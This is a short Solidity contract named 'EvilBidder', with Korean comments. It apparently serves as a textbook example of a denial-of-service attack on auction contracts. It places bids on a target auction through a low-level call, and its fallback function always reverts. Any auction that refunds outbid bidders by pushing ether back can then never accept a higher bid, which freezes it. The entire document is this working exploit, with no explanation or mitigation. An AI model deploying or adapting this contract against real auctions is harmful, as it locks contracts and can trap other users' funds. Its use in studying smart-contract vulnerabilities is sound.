pragma solidity ^0.4.11;
contract  EvilBidder {
	/// Fallback 함수
	function() payable{
		revert();
	}
		
	/// 입찰 처리 함수
	function bid(address _to) public payable {
		// 입찰 처리
		if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
			throw;
		} 
	}
}
